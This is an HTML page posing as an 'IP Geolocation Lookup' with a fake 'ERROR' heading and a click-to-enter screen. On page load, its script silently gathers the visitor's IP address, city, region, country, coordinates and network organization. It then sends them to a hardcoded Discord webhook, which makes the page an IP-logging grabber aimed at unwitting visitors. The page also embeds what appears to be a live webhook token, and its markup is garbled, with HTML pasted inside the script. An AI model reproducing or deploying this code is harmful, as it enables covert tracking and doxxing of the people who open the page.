<!DOCTYPE html>
<html>
<center>
<head>
    <title>IP Geolocation Lookup</title>
</head>
<body>

<div id="result"></div>

<!-- Add a title and an image -->
<h2>ERROR</h2>

<div id="ipResult"></div>

<script>
function getMyIpAddress() {
    fetch("https://api64.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {

            // Fetch geolocation data from ipinfo.io
            fetch("https://ipinfo.io/" + data.ip + "/json")
                .then(response => response.json())
                .then(data => {
                    var ipResultDiv = document.getElementById("ipResult");
                    ipResultDiv.innerHTML = `
                        <p><strong>IP Address:</strong> ${data.ip}</p>
                        <p><strong>City:</strong> ${data.city}</p>
                        <p><strong>Region:</strong> ${data.region}</p>
                        <p><strong>Country:</strong> ${data.country}</p>
                        <p><strong>Location:</strong> ${data.loc}</p>
                        <p><strong>Organization:</strong> ${data.org}
                    `;

                    // Set hex color code and image URL
                    var hexCode = "#903dfe"; // Replace with your desired hex color code
                    var imageUrl = "https://cdn.discordapp.com/attachments/1321729826578763870/1322064016213934121/image.png?ex=676f8390&is=676e3210&hm=b6eea6b14f2ad193b8dec949cd7d3c1b4d2bdb1caa359107a96c3428469f4dd5&"; // Replace with your desired image URL

                    // Send data to Discord webhook as an embed
                    sendToDiscord(data, hexCode, imageUrl);
                })
                .catch(error => {
                    var ipResultDiv = document.getElementById("ipResult");
                    ipResultDiv.innerHTML = "<p>Error retrieving IP information.</p>";
                    console.error("Error retrieving IP information:", error);
                });
        })
        .catch(error => {
            console.error("Error retrieving IP address:", error);
        });
}

function sendToDiscord(data, hexCode, imageUrl) {
    var webhookUrl = "https://discord.com/api/webhooks/1322061709237813308/2FqJOrZzknT70pqAxAW5_W4xrouRD7IMhZJ7FDKPXQlhVeP2AOxV11bEqbZODlSdqPrI"; // Replace with your actual webhook URL
    var payload = {
        embeds: [
            {
                fields: [
                    { name: "IP Address", value: data.ip, inline: true },
                    { name: "City", value: data.city, inline: true },
                    { name: "Region", value: data.region, inline: true },
                    { name: "Country", value: data.country, inline: true },
                    { name: "Location", value: data.loc, inline: true },
                    { name: "Organization", value: data.org, inline: true }
                ],
                color: parseInt(hexCode.replace("#", ""), 16),
                image: { url: imageUrl },
                timestamp: new Date().toISOString()
            }
        ]
    };

    fetch(webhookUrl, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (response.ok) {
            console.log("Data sent to Discord successfully.");
        } else {
            console.error("Error sending data to Discord.");
        }
    })
    .catch(error => {
        console.error("Error sending data to Discord:", error);
    });
}

document.addEventListener("DOMContentLoaded", function() {
    getMyIpAddress();

    <body>
        <div id="black"><button id="enter">Click to Enter Site</button></div>
    <img id="jas" src="jas.png">

    
    <audio id="music" src="sound.mp3" autoplay loop muted></audio>
    <script async defer>
        const black = document.getElementById('black');
        const player = document.getElementById('music');

        const swap = async () => {
            const img = document.getElementById('jas');
            img.src = 'jas.png'
            await new Promise(r => setTimeout(r, 100));
            img.src = 'jas2fdgfdgd.png'
            timer = setTimeout(swap, 200);
        }

        const buttonEvent = () => {
            const btn = document.getElementById('enter');
            btn.addEventListener("click", () => {
                const black = document.getElementById('black');
                const player = document.getElementById('music');
                black.style.visibility = 'hidden'
                player.muted = false;
                player.play();
            })

        }
        buttonEvent()


        let timer = setTimeout(swap, 200);
});
</script>

</body>
</center>
</html>
